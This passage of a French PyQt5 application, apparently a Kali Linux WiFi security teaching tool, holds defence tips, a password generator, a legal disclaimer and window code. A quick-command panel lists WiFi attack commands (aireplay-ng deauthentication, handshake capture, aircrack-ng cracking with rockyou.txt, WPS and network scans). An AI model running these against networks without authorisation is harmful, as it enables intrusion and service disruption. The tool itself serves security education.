            inf.addWidget(Lbl(title,WHITE,11,True))
            inf.addWidget(Lbl(desc,DIM,10))
            fl.addWidget(badge); fl.addLayout(inf,1)
            self._lay.addWidget(f)
        self._lay.addStretch()

# ══════════════════════════════════════════════════════════════════
#  ONGLET DÉFENSE
# ══════════════════════════════════════════════════════════════════
class TabDefense(QScrollArea):
    def __init__(self):
        super().__init__()
        self.setWidgetResizable(True); self.setStyleSheet("border:none;background:transparent;")
        w=QWidget(); lay=QVBoxLayout(w)
        lay.setContentsMargins(14,14,14,14); lay.setSpacing(8)
        lay.addWidget(Lbl("Défense & Bonnes Pratiques",WHITE,19,True))
        lay.addWidget(Lbl("Guide complet de sécurisation WiFi",DIM,10))
        lay.addWidget(HRule())
        for k,t in [
            ("success","<b>✅ WPA3 ou WPA2-AES :</b> Toujours le plus récent. WEP et WPA1 sont cassés."),
            ("success","<b>✅ MDP 16+ chars :</b> Maj + min + chiffres + symboles.<br>Ex: <code style='color:#00d4ff'>Kh@9#mR!2xL$vP5q</code>"),
            ("warn",   "<b>⚠ Désactiver WPS :</b> Cracké en quelques heures même avec MDP fort."),
            ("warn",   "<b>⚠ SSID neutre :</b> \"Livebox-XXXX\" révèle le modèle et ses failles."),
            ("warn",   "<b>⚠ Réseau invité :</b> Séparer IoT et visiteurs du réseau principal."),
            ("danger", "<b>🚫 Jamais :</b> WEP, WPA1, <code>password</code>, <code>12345678</code>, dates."),
        ]: lay.addWidget(TipW(t,k))
        lay.addWidget(HRule())
        # Générateur
        gg=QGroupBox("// GÉNÉRATEUR MOT DE PASSE FORT"); gl=QVBoxLayout(gg)
        r1=QHBoxLayout(); r1.setSpacing(8)
        self._len=QSpinBox(); self._len.setRange(8,64); self._len.setValue(20)
        self._len.setSuffix(" chars")
        bg=Btn("🎲 Générer",CYAN); bc=Btn("📋 Copier",GREEN,sm=True)
        bg.clicked.connect(self._gen); bc.clicked.connect(self._copy)
        r1.addWidget(Lbl("Longueur:",DIM,10)); r1.addWidget(self._len)
        r1.addWidget(bg); r1.addWidget(bc); r1.addStretch()
        gl.addLayout(r1)
        self._pwd=QLineEdit(); self._pwd.setReadOnly(True)
        self._pwd.setText("Cliquez Générer →")
        self._pwd.setStyleSheet(f"""
            QLineEdit{{background:{BG};border:1px solid {B2};color:{CYAN};
              padding:14px;font-size:16px;letter-spacing:3px;border-radius:3px;}}""")
        gl.addWidget(self._pwd)
        self._str=Lbl("",DIM,10); gl.addWidget(self._str)
        lay.addWidget(gg)
        # Checklist
        cg=QGroupBox("// CHECKLIST SÉCURITÉ"); cl=QVBoxLayout(cg)
        for ok,txt in [
            (True, "Utiliser WPA3 si disponible, sinon WPA2-AES"),
            (True, "Mot de passe ≥ 16 chars, complexe et unique"),
            (False,"Désactiver WPS dans l'interface admin du routeur"),
            (True, "SSID neutre — ne révèle pas le modèle"),
            (True, "Réseau invité séparé pour IoT et visiteurs"),
            (False,"Activer le filtrage MAC si possible"),
            (True, "Mettre à jour le firmware du routeur"),
        ]:
            r=QHBoxLayout(); r.setSpacing(8)
            r.addWidget(Lbl("✅" if ok else "❌",TEXT,13))
            r.addWidget(Lbl(txt,TEXT if ok else DIM,11),1)
            cl.addLayout(r)
        lay.addWidget(cg); lay.addStretch(); self.setWidget(w)

    def _gen(self):
        n=self._len.value()
        chars=string.ascii_letters+string.digits+"!@#$%^&*()-_=+[]{}|;:,.<>?"
        pwd="".join(secrets.choice(chars) for _ in range(n))
        self._pwd.setText(pwd)
        ent=math.log2(len(chars)**n)
        y=(2**ent)/(5e5*86400*365)
        st=("FAIBLE" if n<10 else "MOYEN" if n<14 else "FORT" if n<18 else "TRÈS FORT")
        col={"FAIBLE":RED,"MOYEN":ORANGE,"FORT":YELLOW,"TRÈS FORT":GREEN}[st]
        yr=">10²⁰ ans" if y>1e20 else f"{y:.2e} ans"
        self._str.setText(f"  {st}  ·  {ent:.0f} bits  ·  Brute force GPU: ~{yr}")
        self._str.setStyleSheet(
            f"color:{col};font-size:10px;background:transparent;")

    def _copy(self):
        QApplication.clipboard().setText(self._pwd.text())

# ══════════════════════════════════════════════════════════════════
#  SIDEBAR
# ══════════════════════════════════════════════════════════════════
class Sidebar(QWidget):
    goto=pyqtSignal(int)
    NAV=[(0,"📊","Vue d'ensemble"),(1,"⌨ ","Terminal Linux"),
         (2,"🔓","Phase 1 — Vulnérable"),(3,"🔒","Phase 2 — Sécurisé"),
         (4,"⚔ ","Méthodes d'Attaque"),(5,"📡","Appareils Réseau"),
         (6,"🐛","Vulnérabilités"),(7,"🛡 ","Défense & Conseils")]

    def __init__(self):
        super().__init__()
        self.setFixedWidth(208)
        self.setStyleSheet(
            f"QWidget{{background:{BG1};border-right:1px solid {B1};}}")
        lay=QVBoxLayout(self); lay.setContentsMargins(10,14,10,10); lay.setSpacing(3)
        logo=QLabel("🔐 WiFi Security Demo")
        logo.setStyleSheet(
            f"font-size:13px;font-weight:bold;color:{CYAN};"
            f"letter-spacing:1px;margin-bottom:2px;")
        sub=QLabel("v4.0  ·  Kali Linux  ·  PyQt5")
        sub.setStyleSheet(f"font-size:9px;color:{DIM};letter-spacing:.5px;")
        lay.addWidget(logo); lay.addWidget(sub); lay.addWidget(self._sep())
        self._btns=[]
        for idx,ico,name in self.NAV:
            b=QPushButton(f" {ico}  {name}"); b.setCheckable(True)
            b.setStyleSheet(f"""
                QPushButton{{background:transparent;border:1px solid transparent;
                  color:{TEXT};text-align:left;padding:8px 10px;border-radius:3px;
                  font-size:10px;
                  font-family:"JetBrains Mono","Courier New",monospace;}}
                QPushButton:hover{{background:rgba(0,212,255,.07);
                  border-color:{B2};color:{WHITE};}}
                QPushButton:checked{{background:rgba(0,212,255,.13);
                  border-color:{CYAN};color:{CYAN};}}""")
            b.clicked.connect(lambda _,i=idx: self.goto.emit(i))
            self._btns.append(b); lay.addWidget(b)
        self._btns[0].setChecked(True)
        lay.addWidget(self._sep())
        lay.addWidget(Lbl("INTERFACE WIFI",DIM,9))
        self.iface_box=QComboBox(); self.iface_box.addItems(["wlan0","wlan0mon","wlan1"])
        lay.addWidget(self.iface_box)
        lay.addWidget(self._sep())
        lay.addWidget(Lbl("SYSTÈME",DIM,9))
        self._sys={}
        for k in ["OS","Kernel","User"]:
            r=QHBoxLayout(); r.setSpacing(4)
            r.addWidget(Lbl(k+":",DIM,9))
            v=Lbl("—",TEXT,9); self._sys[k]=v; r.addWidget(v,1); lay.addLayout(r)
        lay.addStretch()
        bst=QPushButton("■  TOUT ARRÊTER")
        bst.setStyleSheet(f"""
            QPushButton{{background:rgba(255,32,80,.1);border:1px solid {RED};
              color:{RED};padding:9px;border-radius:3px;
              font-size:10px;font-family:"JetBrains Mono",monospace;}}
            QPushButton:hover{{background:rgba(255,32,80,.22);}}""")
        bst.clicked.connect(lambda: self.goto.emit(-1)); lay.addWidget(bst)

    def activate(self,idx):
        for i,b in enumerate(self._btns): b.setChecked(i==idx)

    def set_sys(self,k,v):
        if k in self._sys: self._sys[k].setText(v)

    def set_ifaces(self,lst):
        self.iface_box.clear(); self.iface_box.addItems(lst or ["wlan0"])

    def _sep(self):
        l=QFrame(); l.setFrameShape(QFrame.HLine)
        l.setStyleSheet(f"color:{B1};background:{B1};max-height:1px;margin:5px 0;")
        return l

# ══════════════════════════════════════════════════════════════════
#  PANNEAU LOG
# ══════════════════════════════════════════════════════════════════
class LogPanel(QWidget):
    def __init__(self):
        super().__init__()
        self.setFixedWidth(255)
        self.setStyleSheet(f"background:{BG1};border-left:1px solid {B1};")
        lay=QVBoxLayout(self); lay.setContentsMargins(8,8,8,8); lay.setSpacing(5)
        hr=QHBoxLayout()
        hr.addWidget(Lbl("// JOURNAL",DIM,9))
        bc=Btn("✕",DIM,sm=True); bc.setFixedSize(22,18)
        bc.clicked.connect(lambda: self._log.clear())
        hr.addStretch(); hr.addWidget(bc); lay.addLayout(hr)
        self._log=QPlainTextEdit(); self._log.setReadOnly(True)
        self._log.setStyleSheet(f"""
            QPlainTextEdit{{background:transparent;border:none;color:{DIM};
              font-size:10px;
              font-family:"JetBrains Mono","Courier New",monospace;}}""")
        lay.addWidget(self._log,1)
        lay.addWidget(self._sep())
        lay.addWidget(Lbl("// COMMANDES RAPIDES",DIM,9))
        ref=QPlainTextEdit(); ref.setReadOnly(True); ref.setMaximumHeight(180)
        ref.setStyleSheet(f"""
            QPlainTextEdit{{background:#010306;border:1px solid {B1};border-radius:3px;
              color:{GREEN};font-size:9px;
              font-family:"JetBrains Mono","Courier New",monospace;padding:7px;}}""")
        CMDS=[("# Mode moniteur",DIM),
              ("airmon-ng start wlan0",GREEN),
              ("# Scan réseaux",DIM),
              ("nmcli dev wifi list",GREEN),
              ("# Scan passif",DIM),
              ("airodump-ng wlan0mon",GREEN),
              ("# Capture HS",DIM),
              ("airodump-ng --bssid XX",GREEN),
              ("  -c 6 -w /tmp/hs wlan0mon",GREEN),
              ("# Déauth",DIM),
              ("aireplay-ng --deauth 5",GREEN),
              ("  -a XX wlan0mon",GREEN),
              ("# Cracker",DIM),
              ("aircrack-ng -w rockyou.txt",GREEN),
              ("  /tmp/hs-01.cap",GREEN),
              ("# WPS scan",DIM),
              ("wash -i wlan0mon",GREEN),
              ("# ARP scan",DIM),
              ("arp-scan 192.168.1.0/24",GREEN),
              ("# Nmap",DIM),
              ("nmap -sn 192.168.1.0/24",GREEN),]
        for (cmd,col) in CMDS:
            cur=ref.textCursor(); cur.movePosition(QTextCursor.End)
            fmt=QTextCharFormat(); fmt.setForeground(QColor(col))
            cur.insertText(cmd+"\n",fmt)
        lay.addWidget(ref)

    def log(self,msg,kind="data"):
        C2={"ok":GREEN,"err":RED,"warn":ORANGE,"info":CYAN,"data":TEXT}
        now=datetime.now().strftime("%H:%M:%S")
        cur=self._log.textCursor(); cur.movePosition(QTextCursor.End)
        fmt=QTextCharFormat(); fmt.setForeground(QColor(C2.get(kind,TEXT)))
        cur.insertText(f"[{now}] {msg}\n",fmt)
        self._log.setTextCursor(cur); self._log.ensureCursorVisible()
        if self._log.document().blockCount()>400:
            c2=self._log.textCursor()
            c2.movePosition(QTextCursor.Start)
            c2.select(QTextCursor.LineUnderCursor); c2.removeSelectedText(); c2.deleteChar()

    def _sep(self):
        l=QFrame(); l.setFrameShape(QFrame.HLine)
        l.setStyleSheet(f"color:{B1};background:{B1};max-height:1px;"); return l

# ══════════════════════════════════════════════════════════════════
#  DISCLAIMER
# ══════════════════════════════════════════════════════════════════
class Disclaimer(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("⚠ Avertissement Légal")
        self.setFixedSize(540,555)
        self.setWindowFlags(Qt.Dialog|Qt.WindowTitleHint)
        self.setStyleSheet(QSS+f"QDialog{{background:{PANEL};border:2px solid {RED};}}")
        lay=QVBoxLayout(self); lay.setContentsMargins(28,28,28,28); lay.setSpacing(12)
        t1=QLabel("⚠  AVERTISSEMENT LÉGAL")
        t1.setStyleSheet(
            f"font-family:'JetBrains Mono',monospace;font-size:20px;"
            f"font-weight:bold;color:{RED};letter-spacing:1px;")
        t2=QLabel("WIFI SECURITY DEMO  —  USAGE ÉDUCATIF UNIQUEMENT")
        t2.setStyleSheet(f"color:{DIM};font-size:9px;letter-spacing:2px;")
        lay.addWidget(t1); lay.addWidget(t2); lay.addWidget(HRule())
        for ico,txt in [
            ("🎓","Outil destiné exclusivement à la démonstration pédagogique, "
                  "sur des réseaux dont vous êtes propriétaire."),
            ("⚖", "Tester un réseau WiFi sans autorisation est illégal. "
                  "Risque de poursuites pénales."),
            ("🔒","Utilisez uniquement votre propre hotspot Android/PC "
                  "ou un réseau de test isolé."),
            ("📚","But: comprendre les vulnérabilités pour mieux défendre."),
        ]:
            f=QFrame()
            f.setStyleSheet(
                f"QFrame{{background:rgba(255,32,80,.05);"
                f"border:1px solid rgba(255,32,80,.2);border-radius:3px;}}")
            fl=QHBoxLayout(f); fl.setContentsMargins(10,9,10,9); fl.setSpacing(10)
            ic=QLabel(ico); ic.setFixedWidth(24)
            ic.setStyleSheet("font-size:17px;background:transparent;border:none;")
            tx=QLabel(txt); tx.setWordWrap(True)
            tx.setStyleSheet(
                f"font-size:11px;color:{TEXT};background:transparent;border:none;")
            fl.addWidget(ic); fl.addWidget(tx,1); lay.addWidget(f)
        self._chk=QCheckBox(
            "Je comprends — Je teste uniquement sur mon propre réseau")
        self._chk.setStyleSheet(f"font-size:12px;color:{TEXT};")
        self._chk.stateChanged.connect(
            lambda s: self._ok.setEnabled(s==Qt.Checked))
        lay.addWidget(self._chk)
        self._ok=QPushButton("ENTRER DANS L'APPLICATION  →")
        self._ok.setEnabled(False)
        self._ok.setStyleSheet(f"""
            QPushButton{{background:#3a1020;border:none;color:#6a3040;
              padding:14px;font-family:'JetBrains Mono',monospace;
              font-size:14px;font-weight:bold;border-radius:3px;}}
            QPushButton:enabled{{background:{RED};color:#fff;}}
            QPushButton:enabled:hover{{background:#ff5577;}}""")
        self._ok.clicked.connect(self.accept); lay.addWidget(self._ok)

# ══════════════════════════════════════════════════════════════════
#  FENÊTRE PRINCIPALE
# ══════════════════════════════════════════════════════════════════
class MainWin(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🔐 WiFi Security Demo  ·  v5.0  ·  Kali Linux")
        self.setMinimumSize(1080,680); self.resize(1300,820)
        self.setStyleSheet(QSS)
        self._nets=[]
        self._build()
        self._toolbar_setup()
        self._statusbar_setup()
        self._detect_system()

    def _build(self):
        root=QWidget(); self.setCentralWidget(root)
        rl=QHBoxLayout(root); rl.setContentsMargins(0,0,0,0); rl.setSpacing(0)
        self._side=Sidebar()
        self._side.goto.connect(self._goto)
        rl.addWidget(self._side)
        self._stack=QStackedWidget()
        self._term=Terminal()
        self._term.notify.connect(lambda m,k: self._lp.log(m,k))
        self._term.networks.connect(self._on_nets)
        self._ov  =TabOverview(self._term)
        self._p1  =TabPhase1(self._term)
        self._p2  =TabPhase2(self._term)
        self._atk =TabAttacks(self._term)
        self._dev =TabDevices(self._term)
        self._vul =TabVulns(self._term)
        self._def =TabDefense()
        for w in [self._ov,self._term,self._p1,self._p2,
                  self._atk,self._dev,self._vul,self._def]:
            self._stack.addWidget(w)
        self._lp=LogPanel()
        spl=QSplitter(Qt.Horizontal)
        spl.addWidget(self._stack); spl.addWidget(self._lp)
        spl.setStretchFactor(0,1); spl.setStretchFactor(1,0)
        spl.setSizes([1020,255])
        rl.addWidget(spl,1)
        self._goto(0)

    def _on_nets(self,nets):
        if not nets: return
        self._nets=nets
        self._ov.load(nets)
        self._vul.set_nets(nets)
        self._atk.set_nets(nets)
        self._lp.log(f"{len(nets)} réseaux reçus","info")

    def _toolbar_setup(self):
        tb=self.addToolBar("nav"); tb.setMovable(False)
        for n,i in [("📊 VUE",0),("⌨ TERMINAL",1),("🔓 PHASE1",2),
                     ("🔒 PHASE2",3),("⚔ ATTAQUES",4),("📡 APPAREILS",5),
                     ("🐛 VULNS",6),("🛡 DÉFENSE",7)]:
            a=QAction(n,self); a.triggered.connect(lambda _,x=i: self._goto(x))
            tb.addAction(a)
        tb.addSeparator()
        sa=QAction("■ STOP",self); sa.triggered.connect(self._term.stop)
        tb.addAction(sa)
        # Zoom dans toolbar aussi
        tb.addSeparator()
        za=QAction("A-",self); za.triggered.connect(self._term.zoom_out); tb.addAction(za)
        zb=QAction("A+",self); zb.triggered.connect(self._term.zoom_in);  tb.addAction(zb)

    def _statusbar_setup(self):
        sb=self.statusBar()
        self._st_dot=Lbl("●",GREEN,11); sb.addWidget(self._st_dot)
        self._st_msg=Lbl("  Prêt",DIM,10); sb.addWidget(self._st_msg)
        self._st_t=Lbl("",DIM,10); sb.addPermanentWidget(self._st_t)
        t=QTimer(self)
        t.timeout.connect(lambda: self._st_t.setText(
            datetime.now().strftime("%H:%M:%S  %d/%m/%Y")))
        t.start(1000)

    def _goto(self,idx):
        if idx==-1:
            self._term.stop(); self._lp.log("Arrêt d'urgence","warn"); return
        self._stack.setCurrentIndex(idx)
        self._side.activate(idx)

    def _detect_system(self):
        class W(QThread):
            done=pyqtSignal(object)
            def run(self):
                def sh(c):
                    r=subprocess.run(c,shell=True,capture_output=True,
                                     text=True,timeout=5)
                    return r.stdout.strip()
                distro=sh(
                    "cat /etc/os-release 2>/dev/null"
                    "|grep PRETTY_NAME|cut -d= -f2|tr -d '\"'"
                ) or "Kali Linux"
                kernel=sh("uname -r"); user=sh("whoami")
                ifaces=[x.strip() for x in sh(
                    "iw dev 2>/dev/null|awk '/Interface/{print $2}'"
                ).splitlines() if x.strip()]
                if not ifaces:
                    ifaces=[x.strip() for x in sh(
                        "ip link show|grep -E '^[0-9]+'|"
                        "awk -F': ' '{print $2}'|grep -v lo"
                    ).splitlines() if x.strip()]
                # Statut NetworkManager
                nm_active=sh("systemctl is-active NetworkManager")
                # Statut mode moniteur
                mon_active=bool(sh("iw dev wlan0mon info 2>/dev/null"))
                self.done.emit((distro[:20],kernel,user,ifaces,nm_active,mon_active))
        self._dw=W()
        def on(r):
            distro,kernel,user,ifaces,nm_active,mon_active=r
            self._side.set_sys("OS",distro)
            self._side.set_sys("Kernel",kernel)
            self._side.set_sys("User",user)
            if ifaces:
                self._side.set_ifaces(ifaces)
                self._ov.set_ifaces(ifaces)
            self._lp.log(f"{distro} · {user}","ok")
            # Alertes NetworkManager
            if mon_active:
                self._lp.log("⚠ wlan0mon actif — nmcli limité","warn")
                self._lp.log("  → Phase1 Étape2 → 🔄 Restaurer NM","warn")
            elif nm_active != "active":
                self._lp.log("⚠ NetworkManager arrêté","warn")
                self._lp.log("  → Scans nmcli indisponibles","warn")
                self._lp.log("  → Cliquez 🔄 Restaurer NM (Phase1)","warn")
            else:
                self._lp.log("✅ NetworkManager actif","ok")
        self._dw.done.connect(on); self._dw.start()

# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════
def main():
    app=QApplication(sys.argv)
    app.setApplicationName("WiFi Security Demo v4")

    pix=QPixmap(400,160); pix.fill(QColor(BG))
    p=QPainter(pix)
    p.setPen(QColor(B1)); p.drawRect(0,0,399,159)
    p.setPen(QColor(CYAN)); p.setFont(QFont("JetBrains Mono",17,QFont.Bold))
    p.drawText(18,58,"🔐  WiFi Security Demo  v5.0")
    p.setPen(QColor(DIM)); p.setFont(QFont("JetBrains Mono",10))
    p.drawText(18,82,"PyQt5  ·  Kali Linux  ·  Terminal intégré")
    p.drawText(18,102,"✔ AUTO capture.cap  ✔ Pipeline aircrack complet")
    p.drawText(18,122,"✔ Deauth automatique  ✔ Handshake détection auto")
    p.drawText(18,146,"Chargement…")
    p.end()
    splash=QSplashScreen(pix); splash.show(); app.processEvents()

    dlg=Disclaimer(); splash.close()
    if dlg.exec_()!=QDialog.Accepted: sys.exit(0)

    win=MainWin(); win.show()
    sys.exit(app.exec_())

if __name__=="__main__":
    main()